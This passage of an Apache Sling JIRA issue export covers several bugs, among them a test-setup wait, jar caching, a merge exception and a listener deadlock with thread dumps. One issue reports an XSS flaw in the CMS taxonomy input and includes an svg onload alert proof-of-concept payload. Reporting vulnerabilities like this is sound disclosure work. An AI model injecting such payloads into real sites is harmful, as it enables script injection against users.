&lt;p&gt;Currently, the waitForQuietPeriod pause is happening every time the SlingTestBase#getServerBaseUrl or SlingTestBase#getOsgiConsoleClient is invoked.&#160; If your tests happen to call either of those apis then you may get unexpected waiting during your test run.&lt;/p&gt;

&lt;p&gt;Expected:&lt;/p&gt;

&lt;p&gt;After the SlingTestBase#waitForQuietPeriod has been invoked once, it should not do the wait logic again.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13487363">SLING-11631</key>
            <summary>The server ready waitForQuietPeriod pause should only happen once</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="5" iconUrl="https://issues.apache.org/jira/images/icons/statuses/resolved.png" description="A resolution has been taken, and it is awaiting verification by reporter. From here issues are either reopened, or are closed.">Resolved</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="enorman">Eric Norman</assignee>
                                    <reporter username="enorman">Eric Norman</reporter>
                        <labels>
                    </labels>
                <created>Thu, 20 Oct 2022 19:40:27 +0000</created>
                <updated>Thu, 20 Oct 2022 19:56:06 +0000</updated>
                            <resolved>Thu, 20 Oct 2022 19:56:06 +0000</resolved>
                                                    <fixVersion>Apache Sling Server Setup Tools 1.0.6</fixVersion>
                                    <component>Testing</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                <comments>
                            <comment id="17621344" author="enorman" created="Thu, 20 Oct 2022 19:56:06 +0000"  >&lt;p&gt;Fixed at: &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-testing-serversetup/commit/c97ac74e3e40beceedeb68f51b112a8de417d98d&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;c97ac74&lt;/a&gt; + &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-testing-serversetup/commit/d3ad7c82f4f1d1921ed29459a873785a2895eb6a&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;d3ad7c8&lt;/a&gt;&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 6 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z19js0:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11630] Feature model IOUtils should not use caches for jar files from jar url connection</title>
                <link>https://issues.apache.org/jira/browse/SLING-11630</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;The JarUrlConnection is set to use caches for JarFiles by default. That is a problem because if there is more than one connection for the same JarFile and the connection is going away, it will close the JarFile - potentially causing the users of the JarFile from the other (still open) connection with a closed JarFile. &lt;/p&gt;

&lt;p&gt;To work around this problem, the IOUtils should set use caches to false on the connections it creates.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13487098">SLING-11630</key>
            <summary>Feature model IOUtils should not use caches for jar files from jar url connection</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="karlpauls">Karl Pauls</assignee>
                                    <reporter username="karlpauls">Karl Pauls</reporter>
                        <labels>
                    </labels>
                <created>Wed, 19 Oct 2022 14:21:13 +0000</created>
                <updated>Mon, 31 Oct 2022 05:46:13 +0000</updated>
                            <resolved>Wed, 19 Oct 2022 14:23:04 +0000</resolved>
                                    <version>Feature Model 1.2.30</version>
                                    <fixVersion>Feature Model 1.3.0</fixVersion>
                                    <component>Feature Model</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                <comments>
                            <comment id="17620384" author="karlpauls" created="Wed, 19 Oct 2022 14:23:04 +0000"  >&lt;p&gt;Done in &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-feature/pull/31&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-feature/pull/31&lt;/a&gt;&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 1 week ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z19i5c:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11627] ConcurrentModificationException when merging configurations</title>
                <link>https://issues.apache.org/jira/browse/SLING-11627</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;When there is a clash of configurations, merging two features using the BuilderUtil might throw a concurrent modification exception&lt;/p&gt;</description>
                <environment></environment>
        <key id="13487062">SLING-11627</key>
            <summary>ConcurrentModificationException when merging configurations</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="cziegeler">Carsten Ziegeler</assignee>
                                    <reporter username="cziegeler">Carsten Ziegeler</reporter>
                        <labels>
                    </labels>
                <created>Wed, 19 Oct 2022 11:41:29 +0000</created>
                <updated>Mon, 31 Oct 2022 05:46:09 +0000</updated>
                            <resolved>Wed, 19 Oct 2022 11:54:12 +0000</resolved>
                                    <version>Feature Model 1.2.30</version>
                                    <fixVersion>Feature Model 1.3.0</fixVersion>
                                    <component>Feature Model</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                <comments>
                            <comment id="17620236" author="cziegeler" created="Wed, 19 Oct 2022 11:43:10 +0000"  >&lt;p&gt;Potential fix in &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-feature/commit/9138a38d88916ab05a7abd6878441fbac0cfa6d7&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-feature/commit/9138a38d88916ab05a7abd6878441fbac0cfa6d7&lt;/a&gt; which also avoids merging the extra properties containing the origins&lt;/p&gt;</comment>
                            <comment id="17620281" author="cziegeler" created="Wed, 19 Oct 2022 11:54:32 +0000"  >&lt;p&gt;Some code clean up &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-feature/commit/8c05b0650ce21a0607cce7f8c029f93f21114886&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-feature/commit/8c05b0650ce21a0607cce7f8c029f93f21114886&lt;/a&gt;&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 1 week ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z19hxc:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11622] Unexpected input may cause xss risk in Taxonomy</title>
                <link>https://issues.apache.org/jira/browse/SLING-11622</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;when we use sling-cms demo &#65292;we find it that input in &lt;span class=&quot;error&quot;&gt;&amp;#91;+taxonomy item&amp;#93;&lt;/span&gt; &#160;may cause the XSS vulnerability&#12290;&lt;/p&gt;

&lt;p&gt;some one like eg.&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
&lt;span class=&quot;code-comment&quot;&gt;//&#20195;&#30721;&#21344;&#20301;&#31526;
&lt;/span&gt;&quot;&amp;gt;&amp;lt;svg onload=alert(&lt;span class=&quot;code-quote&quot;&gt;&apos;xss&apos;&lt;/span&gt;)&amp;gt;&amp;lt;/svg&amp;gt; &lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;span class=&quot;image-wrap&quot; style=&quot;&quot;&gt;&lt;img src=&quot;https://issues.apache.org/jira/secure/attachment/13051052/13051052_image-2022-10-18-16-09-21-603.png&quot; style=&quot;border: 0px solid black&quot; /&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;

&lt;p&gt;&lt;span class=&quot;image-wrap&quot; style=&quot;&quot;&gt;&lt;img src=&quot;https://issues.apache.org/jira/secure/attachment/13051051/13051051_image-2022-10-18-16-09-45-520.png&quot; style=&quot;border: 0px solid black&quot; /&gt;&lt;/span&gt;&lt;/p&gt;</description>
                <environment></environment>
        <key id="13486781">SLING-11622</key>
            <summary>Unexpected input may cause xss risk in Taxonomy</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="dklco">Dan Klco</assignee>
                                    <reporter username="QSecTeam">QSec-Team</reporter>
                        <labels>
                    </labels>
                <created>Tue, 18 Oct 2022 08:12:08 +0000</created>
                <updated>Wed, 2 Nov 2022 11:56:57 +0000</updated>
                            <resolved>Wed, 2 Nov 2022 11:56:53 +0000</resolved>
                                    <version>App CMS 1.1.0</version>
                                    <fixVersion>App CMS 1.1.2</fixVersion>
                                    <component>App CMS</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                        <attachments>
                            <attachment id="13051052" name="image-2022-10-18-16-09-21-603.png" size="71148" author="QSecTeam" created="Tue, 18 Oct 2022 08:10:45 +0000"/>
                            <attachment id="13051051" name="image-2022-10-18-16-09-45-520.png" size="160338" author="QSecTeam" created="Tue, 18 Oct 2022 08:11:09 +0000"/>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>2.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 1 week, 2 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z19g9c:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11620] Synchronization issue in Webconsole Security Provider</title>
                <link>https://issues.apache.org/jira/browse/SLING-11620</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;WebconsoleSecurityProvider&apos;s &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-extensions-webconsolesecurityprovider/blob/master/src/main/java/org/apache/sling/extensions/webconsolesecurityprovider/internal/ServicesListener.java&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;ServiceListeners&lt;/a&gt; class has three fields of Listener (an inner class of &lt;tt&gt;ServiceListeners&lt;/tt&gt; implementing &lt;tt&gt;ServiceListener&lt;/tt&gt;) &lt;tt&gt;repositoryListener&lt;/tt&gt;, &lt;tt&gt;authSupportListener&lt;/tt&gt;, &lt;tt&gt;authListener&lt;/tt&gt;.&lt;/p&gt;

&lt;p&gt;Each of listener uses synchronized methods and on any &lt;tt&gt;ServiceChanged&lt;/tt&gt; event it may call &lt;tt&gt;notifyChange&lt;/tt&gt; method of &lt;tt&gt;ServiceListeners&lt;/tt&gt; outer class which is also a synchronized method and in this method we are again calling all of the listener fields&apos; &lt;tt&gt;getService&lt;/tt&gt; sychronized methods&lt;/p&gt;

&lt;p&gt;If two service events for these listeneres fields occur simulatenously a deadlock situation may arise.&lt;/p&gt;

&lt;p&gt;eg:&lt;br/&gt;
Thread1:&lt;/p&gt;
&lt;ul class=&quot;alternate&quot; type=&quot;square&quot;&gt;
	&lt;li&gt;repositoryListener -&amp;gt; serviceChanged&lt;/li&gt;
	&lt;li&gt;synchronized retainSerivce - (self lock acquired)&lt;/li&gt;
	&lt;li&gt;synchronized notifyChange - (outer class&apos; lock acquired)&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;Thread2:&lt;/p&gt;
&lt;ul class=&quot;alternate&quot; type=&quot;square&quot;&gt;
	&lt;li&gt;authSupportListener -&amp;gt; serviceChanged&lt;/li&gt;
	&lt;li&gt;synchronized retainService - (self lock aquired)&lt;/li&gt;
	&lt;li&gt;synchronized notifyChange - (wait for thread 1 to release outer class&apos; lock)&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;Thread1:&lt;/p&gt;
&lt;ul class=&quot;alternate&quot; type=&quot;square&quot;&gt;
	&lt;li&gt;synchronized (authSupportListener) getService - (wait for thread 2 to release the lock)&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;Tried to replicate the scenario &lt;span class=&quot;nobr&quot;&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/attachment/13050931/13050931_WebconsoleServiceListeners.patch&quot; title=&quot;WebconsoleServiceListeners.patch attached to SLING-11620&quot;&gt;WebconsoleServiceListeners.patch&lt;sup&gt;&lt;img class=&quot;rendericon&quot; src=&quot;https://issues.apache.org/jira/images/icons/link_attachment_7.gif&quot; height=&quot;7&quot; width=&quot;7&quot; align=&quot;absmiddle&quot; alt=&quot;&quot; border=&quot;0&quot;/&gt;&lt;/sup&gt;&lt;/a&gt;&lt;/span&gt;. The test in this patch file fails due to timeout.&lt;br/&gt;
On taking thread snapshot you may see the thread blocked and waiting for each other. &lt;span class=&quot;nobr&quot;&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/attachment/13050930/13050930_BlockedThreads.png&quot; title=&quot;BlockedThreads.png attached to SLING-11620&quot;&gt;BlockedThreads.png&lt;sup&gt;&lt;img class=&quot;rendericon&quot; src=&quot;https://issues.apache.org/jira/images/icons/link_attachment_7.gif&quot; height=&quot;7&quot; width=&quot;7&quot; align=&quot;absmiddle&quot; alt=&quot;&quot; border=&quot;0&quot;/&gt;&lt;/sup&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;Shouldn&apos;t these all listener fields and outer class be using the shared lock instead of sychronized methods?&lt;/p&gt;</description>
                <environment></environment>
        <key id="13486264">SLING-11620</key>
            <summary>Synchronization issue in Webconsole Security Provider</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="cziegeler">Carsten Ziegeler</assignee>
                                    <reporter username="sagarmiglani">Sagar Miglani</reporter>
                        <labels>
                    </labels>
                <created>Fri, 14 Oct 2022 07:13:30 +0000</created>
                <updated>Fri, 9 Dec 2022 05:57:50 +0000</updated>
                            <resolved>Tue, 6 Dec 2022 14:06:02 +0000</resolved>
                                    <version>Web Console Security Provider 1.2.6</version>
                                    <fixVersion>Web Console Security Provider 1.2.8</fixVersion>
                                    <component>Extensions</component>
                        <due></due>
                            <votes>1</votes>
                                    <watches>6</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="2400">40m</timespent>
                                <comments>
                            <comment id="17617527" author="sagarmiglani" created="Fri, 14 Oct 2022 07:16:20 +0000"  >&lt;p&gt;Some logs when it happened.&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-xml&quot;&gt;
1LKDEADLOCK    Deadlock detected !!!
NULL           ---------------------
NULL
2LKDEADLOCKTHR  Thread &lt;span class=&quot;code-quote&quot;&gt;&quot;OsgiInstallerImpl&quot;&lt;/span&gt; (0x00000000013DDA00)
3LKDEADLOCKWTR    is waiting for:
4LKDEADLOCKMON      sys_mon_t:0x00007FF767F71FF8 infl_mon_t: 0x00007FF767F72078:
4LKDEADLOCKOBJ      org/apache/sling/extensions/webconsolesecurityprovider/internal/ServicesListener$Listener@0x000000010AE74D28
3LKDEADLOCKOWN    which is owned by:
2LKDEADLOCKTHR  Thread &lt;span class=&quot;code-quote&quot;&gt;&quot;FelixStartLevel&quot;&lt;/span&gt; (0x00000000010D7D00)
3LKDEADLOCKWTR    which is waiting for:
4LKDEADLOCKMON      sys_mon_t:0x00007FF767F720A8 infl_mon_t: 0x00007FF767F72128:
4LKDEADLOCKOBJ      org/apache/sling/extensions/webconsolesecurityprovider/internal/ServicesListener@0x000000010AE74CE8
3LKDEADLOCKOWN    which is owned by:
2LKDEADLOCKTHR  Thread &lt;span class=&quot;code-quote&quot;&gt;&quot;OsgiInstallerImpl&quot;&lt;/span&gt; (0x00000000013DDA00) 
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;OsgiInstallerImpl thread:&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-xml&quot;&gt;
State: Deadlock/Blocked
Monitor: Owns Monitor Lock on org/apache/sling/extensions/webconsolesecurityprovider/internal/ServicesListener$Listener@0x000000010AE74D28 , org/apache/sling/extensions/webconsolesecurityprovider/internal/ServicesListener@0x000000010AE74CE8 
Waiting for Monitor Lock on org/apache/sling/extensions/webconsolesecurityprovider/internal/ServicesListener$Listener@0x000000010AE74D28 , org/apache/sling/extensions/webconsolesecurityprovider/internal/ServicesListener@0x000000010AE74CE8
Java Stack:
at org/apache/sling/extensions/webconsolesecurityprovider/internal/ServicesListener$Listener.getService(ServicesListener.java:218) 
at org/apache/sling/extensions/webconsolesecurityprovider/internal/ServicesListener.notifyChange(ServicesListener.java:90) 
at org/apache/sling/extensions/webconsolesecurityprovider/internal/ServicesListener$Listener.releaseService(ServicesListener.java:257) 
at org/apache/sling/extensions/webconsolesecurityprovider/internal/ServicesListener$Listener.serviceChanged(ServicesListener.java:269) 
at org/apache/felix/framework/EventDispatcher.invokeServiceListenerCallback(EventDispatcher.java:990(Compiled Code)) 
at org/apache/felix/framework/EventDispatcher.fireEventImmediately(EventDispatcher.java:838(Compiled Code)) 
at org/apache/felix/framework/EventDispatcher.fireServiceEvent(EventDispatcher.java:545(Compiled Code)) 
at org/apache/felix/framework/Felix.fireServiceEvent(Felix.java:4833(Compiled Code)) 
at org/apache/felix/framework/Felix.access$000(Felix.java:112(Compiled Code)) 
at org/apache/felix/framework/Felix$1.serviceChanged(Felix.java:434(Compiled Code)) 
at org/apache/felix/framework/ServiceRegistry.unregisterService(ServiceRegistry.java:170(Compiled Code)) 
at org/apache/felix/framework/ServiceRegistrationImpl.unregister(ServiceRegistrationImpl.java:145) 
at org/apache/sling/jcr/base/AbstractSlingRepositoryManager.unregisterService(AbstractSlingRepositoryManager.java:289) 
at org/apache/sling/jcr/base/AbstractSlingRepositoryManager.stop(AbstractSlingRepositoryManager.java:560) 
at com/adobe/granite/repository/impl/SlingRepositoryManager.deactivate(SlingRepositoryManager.java:259) 
at sun/reflect/NativeMethodAccessorImpl.invoke0(Native Method)
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;FelixStartLevel thread&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-xml&quot;&gt;
State: Deadlock/Blocked
Monitor: Owns Monitor Lock on org/apache/sling/extensions/webconsolesecurityprovider/internal/ServicesListener$Listener@0x000000010AE74D28 , org/apache/sling/extensions/webconsolesecurityprovider/internal/ServicesListener@0x000000010AE74CE8 
Waiting for Monitor Lock on org/apache/sling/extensions/webconsolesecurityprovider/internal/ServicesListener$Listener@0x000000010AE74D28 , org/apache/sling/extensions/webconsolesecurityprovider/internal/ServicesListener@0x000000010AE74CE8
Java Stack: 
at org/apache/sling/extensions/webconsolesecurityprovider/internal/ServicesListener.notifyChange(ServicesListener.java:90) 
at org/apache/sling/extensions/webconsolesecurityprovider/internal/ServicesListener$Listener.retainService(ServicesListener.java:241) 
at org/apache/sling/extensions/webconsolesecurityprovider/internal/ServicesListener$Listener.serviceChanged(ServicesListener.java:267) 
at org/apache/felix/framework/EventDispatcher.invokeServiceListenerCallback(EventDispatcher.java:990(Compiled Code)) 
at org/apache/felix/framework/EventDispatcher.fireEventImmediately(EventDispatcher.java:838(Compiled Code)) 
at org/apache/felix/framework/EventDispatcher.fireServiceEvent(EventDispatcher.java:545) 
at org/apache/felix/framework/Felix.fireServiceEvent(Felix.java:4833) 
at org/apache/felix/framework/Felix.registerService(Felix.java:3804) 
